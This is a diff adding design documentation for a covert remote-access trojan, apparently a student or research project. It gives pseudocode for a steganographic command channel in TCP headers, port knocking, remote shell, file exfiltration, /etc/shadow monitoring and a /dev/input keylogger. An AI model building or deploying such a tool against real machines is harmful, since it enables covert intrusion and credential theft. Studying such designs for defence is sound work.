@@ -78,6 +78,506 @@ The following figure gives a detailed picture of how Beacon Protocol works from 
 The following figure gives a high-level example of how an operation can be performed using a combination of Beacon Protocol and regular TCP. The commander asks the victim to perform a file transfer from the commander to the victim, which is performed using the Beacon Protocol (i.e., the asking part is done over Beacon Protocol). And the actual file transfer is done via regular TCP as follows: 
 ![High-level Hybird Model Example](./docs/images/10-high-level-hybird-model-example.png)
 
+##### Beacon Field: Code Section
+Code section is 8 bits long and can take the following values where each value is the symbolic representation of an unique integer within 2^4 = 16 number space:
+
+| Code Value             | Code Value Explanation                                                                 |
+|------------------------|----------------------------------------------------------------------------------------|
+| StartNodeWatchCode     | Tells the victim to start watching a file or a directory.                              |
+| StartKeyLoggerCode     | Tells the victim to start the keylogger.                                               |
+| UninstallCode          | Tells the victim to remove the malware from its file system.                           |
+| DiscCode               | Tells the victim to end the session and go back to listening for port knocks.          |
+| TransferKeylogCode     | Tells the victim to transfer the keylog file of captured keystrokes during keylogging to the commander if one exists. |
+| SendFileCode           | Tells the victim that the commander wishes to copy a file from the commander’s filesystem to the victim’s filesystem. |
+| RecvFileCode           | Tells the victim that the commander wishes to copy a file from the victim’s filesystem to the commander’s filesystem. |
+| RunShellCode           | Tells the victim that the commander wishes to run a remote shell.                      |
+| CrptdPktCode           | Victim sends this packet if checksum validation fails.                                 |
+| InvalidPktCode         | Victim sends this packet if the commander’s packet passes the checksum validation, but there is something wrong with it. |
+
+##### Beacon Protocol Pseudocode: Common Functionality 
+TYPE Beacon{
+	Code: 4-bits
+	Options: 12-bits
+	Port: 16-bits
+}
+
+FUNCTION makeSYNPkt(CommanderBeacon){
+	CommanderKEY = random 16-bit integer
+	encryptedCommanderBeacon = Scramble(CommanderKEY) XOR CommanderBeacon
+checksum = CRC16(encryptedCommanderBeacon)  
+CommanderIPv4.Identification = KEY
+CommanderTCP.SequenceNumber = encryptedCommanderBeacon
+CommanderTCP.WindowSize = checksum
+CommanderTCP.Flags = SYN
+return CommanderTCP/IPv4
+}
+
+FUNCTION makeRSTACKPkt(VictimBeacon, CommanderTCP/IPv4){
+	VictimKEY = CommanderIPv4.Identification + CommanderTCP.SequenceNumber % 2^16
+	encryptedVictimBeacon = Scramble(VictimKEY) XOR VictimBeacon
+	checksum = CRC16(encryptedCommanderBeacon)  
+VictimIPv4.Identification = CommanderIPv4.Identification 
+VictimTCP.SequnceNumber = encryptedVictimBeacon
+VictimTCP.WindowSize = checksum
+VictimTCP.AckNumber = CommanderTCP.SequenceNumber + 1
+VictimTCP.Flags = RST | ACK
+return VictimTCP/IPv4
+}
+
+##### Beacon Protocol Pseudocode: Commander Functionality 
+FOR every user selection{
+	commanderPort = random unused port number
+CommanderBeacon.Code = user selected operation code
+CommanderBeacon.Options = 0
+CommanderBeacon.Port = commanderPort
+CommanderTCP/IPv4 = makeSYNPkt(CommanderBeacon)
+sendOnWire(CommanderTCP)
+VictimTCP/IPv4 = receiveOnWire()
+IF receiveOnWire() timed out:
+	continue 
+checksum = VictimTCP.WindowSize 
+IF checksum != CRC16(VictimTCP.SequenceNumber):
+	continue
+VictimKey  =  CommanderTCP.SequenceNumber + CommanderIPv4.Identification % 2^16
+VictimBeacon = VictimTCP.SequenceNumber XOR VictimKey
+IF VictimBeacon.Code != CommanderBeacon.Code:
+	continue
+	victimPort =  VictimBeacon.Port
+handleOperationOverTCPCommander(operationCode, commanderPort, victimPort)
+}
+
+##### Beacon Protocol Pseudocode: Victim Functionality 
+FOR every packet received on wire{
+	IF packet not from commander’s MAC, IP, and Port:
+		continue 
+	checksum = CommanderTCP.WindowSize
+	IF checksum != CRC16(CommanderTCP.SequenceNumber):
+		victimCode = CrptdPktCode
+	commanderKey = CommanderIPv4.Identification 
+commanderBeacon = Scramble(commanderKey) XOR CommanderTCP.SequenceNumber
+commanderPort = commanderBeacon.Port
+IF victimCode no set:
+	victimCode = commanderBeacon.code
+victimPort = random unused port number
+VictimBeacon.Code = victimCode
+VictimBeacon.Options = 0
+VictimBeacon.Port = victimPort
+VictimTCP/IPv4 = makeRSTACKPkt(VictimBeacon, CommanderTCP/IPv4)
+sendOnWire(victimCode)
+STOP previous operation if any
+WAIT a few seconds for commander to catch up
+handleOperationOverTCPVictim(operationCode, commanderPort, victimPort)
+}
+
+##### Port Knocking Pseudocode: Commander 
+Send TCP SYN packet to victim IPv4 on port 6000
+Wait for one second
+Send TCP SYN packet to victim IPv4 on port 7000
+Wait for one second
+ Send TCP SYN packet to victim IPv4 on port 8000
+Wait for one second
+Send TCP SYN packet to victim IPv4 on port 6000
+Wait for one second
+
+
+##### Port Knocking Pseudocode: Victim
+FOR true{
+Sniff for a TCP SYN packet originating from commander’s IPv4 and port an destined for port 6000
+Sniff for a TCP SYN packet originating from commander’s IPv4 and port an destined for port 7000 for thirty seconds
+IF timed out:
+	continue 
+Sniff for a TCP SYN packet originating from commander’s IPv4 and port an destined for port 8000 thirty seconds
+IF timed out:
+	continue 
+Sniff for a TCP SYN packet originating from commander’s IPv4 and port an destined for port 6000 thirty seconds 
+IF timed out:
+	continue 
+ELSE:
+break
+}
+
+#### Networking
+##### Receiver Component Finite State Machine
+![Receiver Component FSM](./docs/images/11-receiver-component-fsm.png)
+
+#### Sender Component Finite State Machine
+![Sender Component FSM](./docs/images/12-sender-component-fsm.png)
+
+#### Networking Types
+| Type Name        | Type Explanation                                                                                                                                                                                                                       |
+|------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| Route            | Represents the network route from one side to the other. It includes all information needed to send and receive packets to and from the other side. It includes network adaptor name, source and destination MAC addresses, source and destination IPv4 addresses, and source and destination port numbers. |
+| ReceiverOutput   | The type the **Receiver Component** sends to the **Controller Component**. It contains an inbound TCP/IPv4 packet, an error message if an error occurred, and a flag that tells whether the error encountered is a recoverable error. If the error encountered is not a recoverable error, the whole system must shutdown. |
+| SenderOutput     | The response the **Sender Component** produces upon sending an outbound packet. It contains an error if one encountered, and a flag that tells whether the error encountered is recoverable or not. If the error encountered is not a recoverable error, the whole system must shutdown. |
+| ReceiverParams   | The parameters the **Receiver Component** needs to function. It includes a Route type, and an object that facilitates communication with the **Controller Component**.                                                                 |
+| SenderParams     | The parameters the **Sender Component** needs to function. It includes a Route type, and an object that facilitates communication with the **Controller Component**.                                                                 |
+
+type Route{
+    Iface: Network adaptor of host.
+    SrcMAC: MAC address of of network adaptor of host
+    DstMAC: MAC address of network adaptor of peer	
+    SrcIP: IPv4 address assigned to network adaptor of host 	 
+    DstIP: IPv4 address assigned to network adaptor of peer  	
+    SrcPort: Port number number of host service 
+    DstPort: Port number number of peer service 
+}
+
+type ReceiverOutput{
+	Error: Error encountered
+	Recoverable: boolean
+	IPv4: IPV4 layer
+	TCP: TCP layer
+}
+
+type SenderOutput{
+	Error: Error encountered
+	Recoverable: boolean
+}
+
+
+##### Receiver Component Pseudocode
+
+BPFFilter = “ip and tcp and src host Route.DstIP and dst host Route.SrcIP and src port Route.DstIP and dst port Roue.SrcIP and ip[4:2] != 0 and “
+IF is commander:
+	BPFFilter += “(tcp[13] = 0x14 and tcp[8:4] != 0)”
+ELSE IF is victim:
+	BPFFilter += “(tcp[13] = 0x2)”
+
+apply BPFFilter
+if failed:
+	ReceiverOutput.Error 
+	ReceiverOutput.Recoverable = false
+	return ReceiverOutput
+sniff for inbound packets on Route.Iface
+IF failed:
+	ReceiverOutput.Error 
+	ReceiverOutput.Recoverable = false
+	return ReceiverOutput
+FOR each inbound packet:
+	extract IPv4 layer
+	extract TCP layer
+IF failed to extract TCP or IPv4:
+	ReceiverOutput.Error 
+	ReceiverOutput.Recoverable = false
+	return ReceiverOutput
+ELSE:
+	ReceiverOutput.IPv4 = IPv4
+	ReceiverOutput.TCP = TCP 
+	return ReceiverOutput
+
+##### Sender Component Pseudocode
+FOR each partial packet from the Controller:
+	auto-fill empty fields
+	stack Ethernet, IPv4, and TCP layers
+	sent packet on wire
+	IF failed to send:
+		SenderOutput.Error 
+		SenderOutput.Recoverable = false
+		return SenderOutput
+	ELSE:
+		return SenderOutput
+		
+	
+#### File Watching and File Transfer 
+##### File Transfer Pseudocode Finite State Machine: Send File
+![File Send FSM](./docs/images/13-file-send-file-fsm.png)
+
+##### File Transfer Pseudocode Finite State Machine: Receive File
+![File Receive FSM](./docs/images/14-file-receive-fsm.png)
+
+##### Inode Watching Finite State Machine: Victim
+![Inode Watch Victim FSM](./docs/images/15-inode-watch-victim-fsm.png)
+
+##### Inode Watching Finite State Machine: Commander
+![Inode Watch Commander FSM](./docs/images/16-inode-watch-command-fsm.png)
+
+##### Shadow File Watching Finite State Machine
+![Shadow File Watching FSM](./docs/images/17-shadow-file-watching-fsm.png)
+
+##### Types
+| Type Name    | Type Explanation                                                                                                                                          |
+|--------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|
+| FileHeader   | Stores Metadata about a file that is sent before the actual file content during a file transfer. It contains the name and size of the file.              |
+| EventHeader  | A structure that represents a single inode change. It includes inotify Event, size of the inode, and a flag telling whether the inode is a directory or a file. |
+
+type FileHeader{
+	Name: string
+	Size: 64-bit integer
+}
+
+type EventHeader{
+	Event: fnotify.Event
+	Size: 64-bit integer
+	IsDirectory: boolean
+}
+
+##### Common Network Transfer Pseudocode
+FUNCTION netWrite(TCPConnection, Object){
+	ObjectJSONBytes = convertToJSONBytes(Object)
+	IF failed:
+		return Error
+	ObjectJSONBytesLength = length(ObjectJSONBytes)
+	writeToTCP(TCPConnection, ObjectJSONBytesLength)
+	IF failed:
+		return Error
+writeToTCP(ObjectJSONBytes, ObjectJSONBytesLength)	
+IF failed:
+		return Error
+}
+
+FUNCTION netRead(TCPConnection) Object{
+	ObjectJSONBytesLength = readFromTCP(TCPConnection)
+IF failed:
+		return Error
+	JSONbytesBuffer = allocateBytes(ObjectJSONBytesLength)
+ readFromTCP(TCPConnection, JSONbytesBuffer)
+	IF failed:
+		return Error
+	Object = convertJSONToType(JSONbytesBuffer)
+	IF failed:
+		return Error
+	return Object
+}
+
+##### File Transfer Pseudocode
+FUNCTION sendFile(TCPConnection, path){
+	IF path is directory:
+return Error
+ FileHeader.Size = fileSize(path)
+FileHeader.Name = baseName(path)
+netWrite(TCPConnection, FileHeader)
+IF failed:
+	return Error
+copyAllFileBytes(TCPConnection, path)
+IF failed:
+	return Error
+}
+
+FUNCTION receiveFile(TCPConnection, parentDirectoryPath){
+	FileHeader = netRead(TCPConnection) 
+	If failed:
+		return Error
+	newPathFile = joinFilePath(parentDirectoryPath, FileHeader.Name)
+	fileHandle = CreateFileOnDisk(newPathFile)
+	If failed:
+		return Error
+	
+	copyFirstNBytes(fileHandle ,TCPConnection, receiveFile.Size)
+	IF failed:
+		return Error
+}
+
+##### Inode Watching Pseudocode: Victim
+FUNCTION watchInodeVictim(TCPConnection){
+	inodePath = netRead(TCPConnection) 
+	If failed:
+		return Error
+	watcherHandle = inotify.NewWatcher()
+	IF failed:
+		return Error
+	watcherHandle.Add(inodePath)
+	IF failed:
+		return Error
+	FOR every event of watcherHandle:
+			EventHeader.Event = event
+			EventHeader.Size = length(inodePath)
+			
+		IF inodePath is directory:
+EventHeader.Isdirectory = true
+		ELSE IF inodePath is a file:
+			EventHeader.Isdirectory = false
+netWrite(TCPConnection, EventHeader)
+IF failed:
+	return Error
+copyAllFileBytes(TCPConnection, path)
+IF failed:
+	return Error
+}
+
+##### Inode Watching Pseudocode: Commander
+FUNCTION watchInodeCommander(TCPConnection, watchPath,  parentDirectoryPath){
+	netWrite(TCPConnection, watchPath)
+IF failed:
+	return Error
+	WHILE Inode Watch not Stopped{
+		EventHeader = netRead(TCPConnection)
+		IF failed:
+			return Error
+		print(EventHeader.Event)
+		IF HeaderEvent.IsDirectory{
+			Print(EventHeader.Event)
+		} ELSE IF NOT HeaderEvent.IsDirectory{
+Print(EventHeader.Event)
+		newPathFile = joinFilePath(parentDirectoryPath, FileHeader.Name)
+	fileHandle = CreateFileOnDisk(newPathFile)
+	If failed:
+		return Error
+	copyFirstNBytes(fileHandle ,TCPConnection, receiveFile.Size)
+	IF failed:
+		return Error
+		}
+}
+}
+
+##### Inode Watching Pseudocode: Shadow File
+processShadowFileVictim(){
+previousHash = ComputeHash(“/etc/shadow”)
+FOR every time interval:
+currentHash = ComputeHash(“/etc/shadow”)
+IF currentHash != previousHash:
+ previousHash = currentHash
+ writeToFile(“tmp/shadow”, currentHash)
+}
+
+
+processShadowFileCommander(TCPConnection, parentDirectory){
+	watchInodeCommander(TCPConnection, “/tmp/shadow”, parentDirectoryPath)
+	IF failed:
+		return Error	
+}
+
+#### Keylogger
+##### Keylogger Finite State Machine
+![Keylogger FSM](./docs/images/18-keylogger-fsm.png)
+
+##### Keylogger Pseudocode
+FUNCTION findKeyboardDevices(){
+	keyboardDevices  = emptyList
+	FOR every file under /sys/class/input/ directory:
+		extract base name
+		devicePath = joinPath(“/dev/input”, baseName)
+		realPath = evaluatesymbolicLink(devicePath)
+		keyPath = joinPath(realPath, “capabilities/key”)
+		IF hasKeybit(keyPath):
+			keyboardDevices.append(devicePath)
+	return keyboardDevices
+}
+
+FUNCTION logKeyStroke(keylogBuffer){
+	keyboardDevices = findKeyboardDevices()
+	IF keyboardDevices is empty:
+		return
+	FOR each devicePath of keyboardDevices RUN in separate thread:
+		WHILE keylogger not stopped:
+			binaryToken = readBinaryFile(devicePath)
+			IF binaryToken is a key press:
+				keyStroke = convertToReadableFormat(binaryToken)
+				writeToBuffer(keylogBuffer, keyStroke)
+				IF failed:
+					return Error
+}
+
+#### Command Line Interface
+##### Command Line Interface Finite State Machine 
+![Command-line FSM](./docs/images/19-command-line-fsm.png)
+
+#### System Wide Design 
+##### System Wide States: Commander
+| Commander State        | Commander State Explanation                                                                                                                   |
+|------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------|
+| START                  | The starting state of the commander.                                                                                                            |
+| StartedAsRoot          | When the commander is executed with sudo privileges.                                                                                           |
+| RouteInfoReceived      | When all the routing information supplied to the commander regarding its MAC address, IPv4 address, service port, and network adapter and that of the victim is valid. |
+| CLIStarted             | When the command line interface is started, the user can interact with it.                                                                     |
+| ControllerStarted      | When the Controller Component of the commander is started.                                                                                      |
+| ReceiverStarted        | When the Receiver Component of the commander is started.                                                                                       |
+| SenderStarted          | When the Sender Component of the commander is started.                                                                                         |
+| SelectedToExecute      | When the user selects an operation to perform on the victim through the CLI.                                                                   |
+| RandomPortSelected     | When a random port is randomly selected on the commander’s side to be used for the TCP connection, which will be used to carry out the operation selected by the user. |
+| IPv4TCPPktCreated      | When the TCP/IPv4 packet containing steganography encoded information is created.                                                               |
+| IPv4TCPPktSent         | When the TCP/IPv4 packet is sent on wire.                                                                                                       |
+| ResponsePktReceived    | When the response packet of the victim is received by the commander.                                                                            |
+| VictimCodeExtracted    | When the operation code sent by the victim is extracted from the TCP/IPv4 packet sent by the victim.                                            |
+| VictimCodeSame         | When the operation code sent by the victim is the same as the operation code sent by the commander.                                            |
+| VictimPortExtracted    | When the victim port embedded in the TCP/IPv4 is extracted and stored.                                                                         |
+| TCPConnectionEstablished | When the TCP connection between the victim’s random port and the commander’s random port is established.                                      |
+| OperationOver          | When the operation selected by the user is completely carried out over the TCP connection and is over.                                         |
+| CommanderStopped       | When the commander is stopped by the user.                                                                                                      |
+| END                    | The end phase of the commander.                                                                                                                 |
+
+##### System Wide States: Victim
+| Victim State           | Victim State Explanation                                                                                                                         |
+|------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------|
+| START                  | The starting state of the victim.                                                                                                                |
+| SudoPrivilege          | When the victim is run with sudo privileges.                                                                                                     |
+| RouteInfo              | When all the routing information supplied to the victim regarding its MAC address, IPv4 address, service port, and network adapter and that of the commander is valid. |
+| ControllerStarted      | When the **Controller Component** of the victim is started.                                                                                      |
+| ReceiverStarted        | When the **Receiver Component** of the victim is started.                                                                                        |
+| SenderStarted          | When the **Sender Component** of the victim is started.                                                                                          |
+| ReceivedPkt            | When the commander’s TCP/IPv4 packet is received by the victim.                                                                                  |
+| CodeExtracted          | When the operation code the commander sent has been extracted from the TCP/IPv4 packet.                                                          |
+| CommanderPortExtracted | When the port the commander has specified has been extracted from the TCP/IPv4 packet sent by the commander.                                     |
+| RandomPortSelected     | When an unused random port is chosen by the victim.                                                                                              |
+| ResponsePktMade        | When the victim’s TCP/IPv4 response to the commander with steganography encoded information is made.                                             |
+| ResponsePktSent        | When the victim’s TCP/IPv4 packet is sent on wire.                                                                                               |
+| TCPEstablished         | When the TCP connection between the victim’s random port and the commander’s random port is established.                                         |
+| OperationOver          | When the operation selected by the commander is completely carried out over the TCP connection and is over.                                      |
+| CommanderStopped       | When the victim is stopped by the commander or is stopped by IDS.                                                                                |
+| END                    | The end phase of the victim.                                                                                                                     |
+
+##### System Wide State Transition Table: Commander
+| From State           | To State              |
+|----------------------|------------------------|
+| START                | SudoPrivilege          |
+| SudoPrivilege        | RouteInfoValid         |
+| RouteInfoValid       | CLIStarted             |
+| CLIStarted           | ControllerStarted      |
+| ControllerStarted    | ReceiverStarted        |
+| ReceiverStarted      | SenderStarted          |
+| SenderStarted        | GotUserSelection       |
+| GotUserSelection     | RandomPortSelected     |
+| RandomPortSelected   | IPv4TCPPktMade         |
+| IPv4TCPPktMade       | IPv4TCPPktSent         |
+| IPv4TCPPktSent       | ResponsePktReceived    |
+| ResponsePktReceived  | VictimCodeExtracted    |
+| VictimCodeExtracted  | VictimCodeSame         |
+| VictimCodeSame       | VictimPortSelected     |
+| VictimPortSelected   | TCPEstablished         |
+| TCPEstablished       | OperationOver          |
+| OperationOver        | CommanderStopped       |
+| OperationOver        | GotUserSelection       |
+| CommanderStopped     | END                    |
+
+##### System Wide State Transition Table: Victim
+| From State             | To State                |
+|------------------------|-------------------------|
+| START                  | SudoPrivilege           |
+| SudoPrivilege          | RouteInfo               |
+| RouteInfo              | ControllerStarted       |
+| ControllerStarted      | ReceiverStarted         |
+| ReceiverStarted        | SenderStarted           |
+| SenderStarted          | ReceivedPkt             |
+| ReceivedPkt            | CodeExtracted           |
+| CodeExtracted          | CommanderPortExtracted  |
+| CommanderPortExtracted | RandomPortSelected      |
+| RandomPortSelected     | ResponsePktMade         |
+| ResponsePktMade        | ResponsePktSent         |
+| ResponsePktSent        | TCPEstablished          |
+| TCPEstablished         | OperationOver           |
+| OperationOver          | ReceivedPkt             |
+| OperationOver          | CommanderStopped        |
+| CommanderStopped       | END                     |
+
+##### System Wide State Transition Diagram: Commander
+![System Wide State Transition Diagram](./docs/images/20-system-wide-state-transition-diagram.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
